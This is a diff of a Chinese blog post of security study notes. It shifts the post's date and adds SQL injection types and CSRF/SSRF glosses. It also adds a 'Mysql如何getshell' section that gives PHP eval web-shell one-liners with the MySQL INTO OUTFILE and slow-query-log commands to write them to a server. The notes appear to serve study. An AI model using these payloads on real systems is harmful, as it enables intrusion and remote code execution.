@@ -23,16 +23,16 @@
   <meta name="description" content="数据库提权MOF提权：nullevt.mot每分钟执行一次，写入CMD命令，则会执行 UDF提权： 调用自定义函数  启动项提权： 用 MySQL 将自定义脚本导入到启动项中 IPS&#x2F;IDS&#x2F;HIDS IDS 入侵检测系统 HIDS基于主机，检测文件和应急响应等 IPS 入侵防御系统 linux、windows命令：过滤文件、查看进程环境变量​    linux：第一步：获取进">
 <meta property="og:type" content="article">
 <meta property="og:title" content="网络安全知识小计-1">
-<meta property="og:url" content="http://example.com/2022/01/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E5%B0%8F%E8%AE%A1-1/index.html">
+<meta property="og:url" content="http://example.com/2022/02/11/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E5%B0%8F%E8%AE%A1-1/index.html">
 <meta property="og:site_name" content="JJhome">
 <meta property="og:description" content="数据库提权MOF提权：nullevt.mot每分钟执行一次，写入CMD命令，则会执行 UDF提权： 调用自定义函数  启动项提权： 用 MySQL 将自定义脚本导入到启动项中 IPS&#x2F;IDS&#x2F;HIDS IDS 入侵检测系统 HIDS基于主机，检测文件和应急响应等 IPS 入侵防御系统 linux、windows命令：过滤文件、查看进程环境变量​    linux：第一步：获取进">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2022-01-16T06:22:14.000Z">
-<meta property="article:modified_time" content="2022-01-16T06:22:14.000Z">
+<meta property="article:published_time" content="2022-02-11T06:22:14.000Z">
+<meta property="article:modified_time" content="2022-02-11T06:22:14.000Z">
 <meta property="article:author" content="UknowJJ">
 <meta name="twitter:card" content="summary">
 
-<link rel="canonical" href="http://example.com/2022/01/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E5%B0%8F%E8%AE%A1-1/">
+<link rel="canonical" href="http://example.com/2022/02/11/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E5%B0%8F%E8%AE%A1-1/">
 
 
 <script id="page-configurations">
@@ -150,7 +150,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/16/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E5%B0%8F%E8%AE%A1-1/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/11/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E5%B0%8F%E8%AE%A1-1/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -173,7 +173,7 @@
               </span>
               <span class="post-meta-item-text">Posted on</span>
 
-              <time title="Created: 2022-01-16 14:22:14" itemprop="dateCreated datePublished" datetime="2022-01-16T14:22:14+08:00">2022-01-16</time>
+              <time title="Created: 2022-02-11 14:22:14" itemprop="dateCreated datePublished" datetime="2022-02-11T14:22:14+08:00">2022-02-11</time>
             </span>
 
           
@@ -200,10 +200,21 @@
 <p>时间盲注：应用没有明确的回显，只能使用特定的时间函数来判断</p>
 <p>报错注入：应用会显示全部或者部分的报错信息</p>
 <p>堆叠注入：加入 ; 后一次执行多条语句</p>
+<p>还有 宽字节注入、base64注入、cookie注入、XFF注入</p>
+<h3 id="Mysql如何getshell"><a href="#Mysql如何getshell" class="headerlink" title="Mysql如何getshell"></a>Mysql如何getshell</h3><p>（1）利用into outfile写入木马文件</p>
+<p><code>select &quot;&lt;?php eval@($_POST[&#39;cmd&#39;]);?&gt;into outfile &quot;D&quot;\\xxx\\xxx\\xxx</code></p>
+<p>（2）利用日志文件写入木马</p>
+<p>1.开启日志功能</p>
+<p><code>set global slow_query_log=1;</code></p>
+<p>2.设置日志存储路径</p>
+<p><code>set global slow_query_log_file=&#39;D:\\xx\\xx&#39;;</code></p>
+<p>3.执行sql语句</p>
+<p><code>select &#39;&lt;?php @eval($_GET[H])?&gt;&#39; or SLEEP(11);</code></p>
 <h3 id="Xss分类"><a href="#Xss分类" class="headerlink" title="Xss分类"></a>Xss分类</h3><p>存储：储存型XSS相比反射型来说危害较大，在这种漏洞中，攻击者能够把攻击载荷存入服务器的数据库中，造成持久化的攻击。</p>
 <p>Dom：一般和服务器的解析响应没有直接关系，而是在JavaScript脚本动态执行的过程中产生</p>
 <p>反射：反射型XSS通常出现在搜索等功能中，需要被攻击者点击对应的链接才能触发</p>
-<p>CSRF：基于xss，冒充用户发起请求</p>
+<p>CSRF：跨站点请求伪造，基于xss，冒充用户发起请求</p>
+<p>SSRF：服务器端请求伪造</p>
 <p>XEE：在应用程序解读XML时，允许引入外部实体，就可以构造恶意内容，造成读取恶意文件，代码执行，端口探测….</p>
 <h3 id="文件上传、文件包含、目录遍历"><a href="#文件上传、文件包含、目录遍历" class="headerlink" title="文件上传、文件包含、目录遍历"></a>文件上传、文件包含、目录遍历</h3><p>文件上传：利用文件上传功能上传可执行脚本文件，文件上传还可能导致其他问题，比如上传超大文件造成占用带宽占满磁盘等</p>
 <p>文件包含：<code>includ,require</code>等函数可以加载远程文件，如果没有进行过滤，则执行文件的恶意代码</p>
@@ -290,7 +301,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83"><span class="nav-number">1.</span> <span class="nav-text">数据库提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IPS-x2F-IDS-x2F-HIDS"><span class="nav-number">2.</span> <span class="nav-text">IPS&#x2F;IDS&#x2F;HIDS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#linux%E3%80%81windows%E5%91%BD%E4%BB%A4%EF%BC%9A%E8%BF%87%E6%BB%A4%E6%96%87%E4%BB%B6%E3%80%81%E6%9F%A5%E7%9C%8B%E8%BF%9B%E7%A8%8B%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="nav-number">3.</span> <span class="nav-text">linux、windows命令：过滤文件、查看进程环境变量</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WAF%E5%8F%8A%E5%85%B6%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="nav-number">4.</span> <span class="nav-text">WAF及其绕过方式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">5.</span> <span class="nav-text">shiro反序列化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Sql%E6%B3%A8%E5%85%A5%E7%9A%84%E5%88%86%E7%B1%BB"><span class="nav-number">6.</span> <span class="nav-text">Sql注入的分类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Xss%E5%88%86%E7%B1%BB"><span class="nav-number">7.</span> <span class="nav-text">Xss分类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E3%80%81%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"><span class="nav-number">8.</span> <span class="nav-text">文件上传、文件包含、目录遍历</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB"><span class="nav-number">9.</span> <span class="nav-text">栈溢出攻击</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83"><span class="nav-number">1.</span> <span class="nav-text">数据库提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IPS-x2F-IDS-x2F-HIDS"><span class="nav-number">2.</span> <span class="nav-text">IPS&#x2F;IDS&#x2F;HIDS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#linux%E3%80%81windows%E5%91%BD%E4%BB%A4%EF%BC%9A%E8%BF%87%E6%BB%A4%E6%96%87%E4%BB%B6%E3%80%81%E6%9F%A5%E7%9C%8B%E8%BF%9B%E7%A8%8B%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="nav-number">3.</span> <span class="nav-text">linux、windows命令：过滤文件、查看进程环境变量</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WAF%E5%8F%8A%E5%85%B6%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="nav-number">4.</span> <span class="nav-text">WAF及其绕过方式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">5.</span> <span class="nav-text">shiro反序列化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Sql%E6%B3%A8%E5%85%A5%E7%9A%84%E5%88%86%E7%B1%BB"><span class="nav-number">6.</span> <span class="nav-text">Sql注入的分类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Mysql%E5%A6%82%E4%BD%95getshell"><span class="nav-number">7.</span> <span class="nav-text">Mysql如何getshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Xss%E5%88%86%E7%B1%BB"><span class="nav-number">8.</span> <span class="nav-text">Xss分类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E3%80%81%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"><span class="nav-number">9.</span> <span class="nav-text">文件上传、文件包含、目录遍历</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB"><span class="nav-number">10.</span> <span class="nav-text">栈溢出攻击</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
